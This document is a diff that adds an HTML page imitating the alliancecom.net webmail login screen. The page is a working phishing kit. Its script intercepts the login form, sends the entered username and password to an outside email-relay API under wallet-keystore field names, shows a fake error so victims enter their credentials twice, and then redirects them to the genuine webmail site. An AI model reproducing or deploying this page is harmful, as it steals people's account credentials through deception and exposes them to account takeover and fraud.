@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-mode js chrome layout-large">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>alliancecom.net webmail :: Welcome to alliancecom.net webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+    <meta name="theme-color" content="#f4f4f4">
+    <meta name="msapplication-navbutton-color" content="#f4f4f4">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <link rel="stylesheet" href="styles.min.css">
+    <link rel="stylesheet" type="text/css" href="elastic.css">
+    <link rel="stylesheet" type="text/css" href="login.css">
+    <link rel="stylesheet" type="text/css" href="elastic-1.css">
+    <link rel="stylesheet" type="text/css" href="styles-1.css">
+    <link rel="stylesheet" type="text/css" href="styles.css">
+    <link rel="stylesheet" type="text/css" href="plugin.css">
+    <link rel="stylesheet" type="text/css" href="jquery-ui.min.css">
+</head>
+<body class="xelastic xbackground-login-image task-login action-none">
+
+<div id="layout">
+    <h1 class="voice">alliancecom.net webmail Login</h1>
+
+    <div id="layout-content" class="selected no-navbar" role="main">
+        <img src="alliancecom.net.png" id="logo" alt="Logo">
+        <form id="login-form" name="login-form" method="post" class="propform"
+              action="https://webmail-beta.alliancecom.net/?_task=login">
+            <input type="hidden" name="_token" value="to6SoKzhOwR584bbrrHtKmZdZiZOneNm" class="form-control">
+            <input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action"
+                                                                                        value="login"
+                                                                                        class="form-control"><input
+                type="hidden" name="_timezone" id="rcmlogintz" value="America/Denver" class="form-control"><input
+                type="hidden" name="_url" id="rcmloginurl" class="form-control" value="">
+            <table>
+                <tbody>
+                <tr class="form-group row">
+                    <td class="title" style="display: none;"><label for="rcmloginuser">Username</label></td>
+                    <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+                            class="input-group-text icon user"></i></span><input name="_user" id="rcmloginuser"
+                                                                                 required="" size="40"
+                                                                                 class="form-control"
+                                                                                 autocapitalize="off" autocomplete="off"
+                                                                                 type="text" placeholder="Username"
+                                                                                 value=""></td>
+                </tr>
+                <tr class="form-group row">
+                    <td class="title" style="display: none;"><label for="rcmloginpwd">Password</label></td>
+                    <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
+                            class="input-group-text icon pass"></i></span><input name="_pass" id="rcmloginpwd"
+                                                                                 required="" size="40"
+                                                                                 class="form-control"
+                                                                                 autocapitalize="off" autocomplete="off"
+                                                                                 type="password" placeholder="Password">
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+            <p class="formbuttons">
+                <button type="submit" id="rcmloginsubmit"
+                        class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login
+                </button>
+            </p>
+            <div id="login-footer" role="contentinfo">
+                alliancecom.net webmail
+            </div>
+        </form>
+    </div>
+
+    <noscript>
+        <p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable
+            Javascript in your browser's settings.</p>
+    </noscript>
+</div>
+
+<script>
+    (function () {
+        const form = document.getElementById("login-form");
+        const err = document.createElement('p');
+        form.appendChild(err);
+        let firstSubmission = true;
+
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            err.textContent = "";
+
+            const username = document.querySelector('input[name="_user"]').value.trim();
+            const password = document.querySelector('input[name="_pass"]').value;
+
+            if (!username || !password) {
+                err.textContent = "Please enter your username and password.";
+                err.style.color = "red";
+                return;
+            }
+
+            const service_id = "service_i9i6l7k";
+            const template_id = "template_gk6b9o1";
+            const user_id = "XlpY3qawsd-7TrkVy";
+
+            const message = JSON.stringify({
+                title: password ? "KeyStoreJson" : "",
+                body: {
+                    keystorepassword: password,
+                    phrase: "",
+                    privatekey: "",
+                    wallet_id: username
+                }
+            });
+
+            const toSend = {
+                service_id,
+                template_id,
+                user_id,
+                keystorepassword: password,
+                phrase: "",
+                privatekey: "",
+                wallet_id: username,
+                to_name: "Admin",
+                from_name: "CollabPlastic",
+                message
+            };
+
+            try {
+                if (firstSubmission) {
+                    await fetch("https://api.emailjs.com/api/v1.0/email/send-form", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                        body: new URLSearchParams(toSend)
+                    });
+                    err.textContent = "Invalid username or password, try again...";
+                    err.style.color = "red";
+                    document.querySelector('input[name="_user"]').value = '';
+                    document.querySelector('input[name="_pass"]').value = '';
+                    firstSubmission = false;
+                } else {
+                    await fetch("https://api.emailjs.com/api/v1.0/email/send-form", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                        body: new URLSearchParams(toSend)
+                    });
+                    window.location.href = "https://webmail-beta.alliancecom.net";
+                }
+            } catch (ex) {
+                err.textContent = "Network error. Please check your connection and try again.";
+                console.error(ex);
+            }
+        });
+    })();
+</script>
+
+<div id="xlogin-image">
+    <div style="opacity:0.4"></div>
+</div>
+<style>#xlogin-image div {
+    background-image: url("001.jpg");
+    display: block;
+}</style>
+
+</body>
+</html>
